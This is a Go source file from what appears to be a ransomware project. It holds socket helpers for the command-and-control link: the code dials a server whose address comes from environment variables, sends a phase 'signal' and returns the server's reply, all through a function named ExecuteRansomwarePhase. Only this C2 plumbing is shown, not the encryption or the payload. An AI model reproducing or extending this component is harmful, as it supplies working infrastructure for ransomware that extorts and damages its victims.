package utilities

import (
	"log"
	"net"
	"os"
)

// Connect to the server and obtain a connection object(net.Conn)
func obtainServerSocketConnection() net.Conn {
	// Setup server connection information
	protocol := os.Getenv("PROTOCOL")
	serverAddress := os.Getenv("SERVER_ADDRESS")
	serverPort := os.Getenv("SERVER_PORT")
	serverURL := serverAddress + ":" + serverPort

	// Establish a single connection to the server
	serverConnection, err := net.Dial(protocol, serverURL)
	if err != nil {
		log.Panicf("Error connecting to the server: %v", err.Error())
	}

	return serverConnection
}

// Function to receive data from the server
func receiveDataFromServer(serverConnection net.Conn) []byte {
	buffer := make([]byte, 1024)
	_, err := serverConnection.Read(buffer)
	// fmt.Printf("Server says: %s", string(buffer))

	// If the given error is EOF, then the server has closed the connection
	if err != nil {
		if err.Error() == "EOF" {
			// fmt.Println("Server has closed the connection")
			return []byte("LOCAL:SERVER_CLOSED_CONNECTION")
		}
		log.Panicf("Error reading: %v", err.Error())
	}

	return buffer
}

// Function to send data to the server
func sendDataToServer(serverConnection net.Conn, message string) {
	_, err := serverConnection.Write([]byte(message))
	if err != nil {
		log.Panicf("Error writing: %v", err.Error())
	}
}

// Function to execute the ransomware phase
// Specific "signal"(string value) will trigger a specific ransomware phase via the server's C&C
func ExecuteRansomwarePhase(signal string) []byte {
	serverConnection := obtainServerSocketConnection()
	sendDataToServer(serverConnection, signal)
	dataOverServerSocket := receiveDataFromServer(serverConnection)
	serverConnection.Close()

	return dataOverServerSocket
}
